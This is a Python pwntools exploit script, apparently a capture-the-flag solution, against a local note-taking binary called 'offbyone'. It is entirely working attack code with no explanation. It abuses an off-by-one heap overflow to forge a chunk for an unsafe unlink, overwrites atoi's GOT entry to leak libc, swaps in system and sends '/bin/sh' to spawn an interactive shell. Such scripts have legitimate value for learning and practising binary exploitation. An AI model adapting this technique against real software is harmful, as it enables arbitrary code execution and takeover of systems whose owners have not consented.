from pwn import *

p=process("./offbyone")
elf=ELF("./offbyone")
elibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
heap_addr=0x6020C0+0x18

def add_note(size,content):
    p.sendlineafter("4:edit\n","1")
    p.sendlineafter("input len\n",str(size))
    p.sendlineafter("input your data",content)

def delete_note(idx):
    p.sendlineafter("4:edit\n","2")
    p.sendlineafter("input id\n",str(idx))

def show(idx):
    p.sendlineafter("4:edit\n","3")
    p.sendlineafter("input id\n",str(idx))

def edit(idx,content):
    p.sendlineafter("4:edit\n","4")
    p.sendlineafter("input id\n",str(idx))
    p.sendafter("input your data\n",content)

def exp():
    add_note(0x100,'0'*0x100)
    add_note(0x100,"1"*0x100)
    add_note(0x100,'2'*0x100)
    '''
    add_note(0x98,'3'*0x98)
    add_note(0x100,"4"*0x100)
    payload=p64(0)*2+p64(heap_addr-0x18)+p64(heap_addr-0x10)
    payload+='0'*(0x90-len(payload))
    payload+=p64(0x90)+'\x10'
    '''
    add_note(0x88,'3'*0x88)
    add_note(0x100,"4"*0x100)
    payload=p64(0)*2+p64(heap_addr-0x18)+p64(heap_addr-0x10)
    payload = payload.ljust(0x80,'\x00')
    payload += p64(0x80)+'\x10'
    edit(3,payload)
    delete_note(4)
    atoi_addr=elf.got["atoi"]
    edit(3,p64(atoi_addr))
    show(0)
    elibc.address=u64(p.recv(6).ljust(8,'\x00'))-elibc.symbols["atoi"]
    system_addr=elibc.symbols["system"]
    edit(0,p64(system_addr))
    p.sendafter("4:edit\n","/bin/sh\x00")
    p.interactive()

exp()

